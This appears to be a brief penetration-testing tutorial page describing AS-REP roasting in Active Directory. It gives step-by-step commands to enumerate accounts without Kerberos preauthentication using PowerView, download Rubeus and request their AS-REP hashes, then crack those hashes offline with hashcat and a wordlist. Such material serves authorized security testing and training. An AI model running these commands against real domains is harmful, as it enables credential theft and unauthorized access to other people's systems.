---
legal-banner: true
---

### **USING POWERVIEW TO ENUMERATE ACCOUNTS**

1.  Import PowerView module  
    `Import-Module .\PowerView.ps1`
2.  Find users with "Do not require Kerberos preauthentication" flag  
    `Get-DomainUser -PreAuthNotRequired`
3.  Requesting AS-REP for Targeted Users  
    Once you have identified vulnerable accounts request the AS-REP.
4.  Download Rubeus from the GitHub releases page:  
    `Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.5.0/Rubeus.zip" -OutFile "Rubeus.zip"`
5.  Unzip the downloaded file to a directory of your choice:  
    `Expand-Archive -Path "Rubeus.zip" -DestinationPath ".\Rubeus"`
6.  Request AS-REP:  
    `.\Rubeus.exe asreproast`
7.  Save the AS-REP hashes to a file named  
    `asrep_hashes.txt`.
8.  Use Hashcat to crack the hashes with a wordlist such as rockyou.txt:  
    `hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`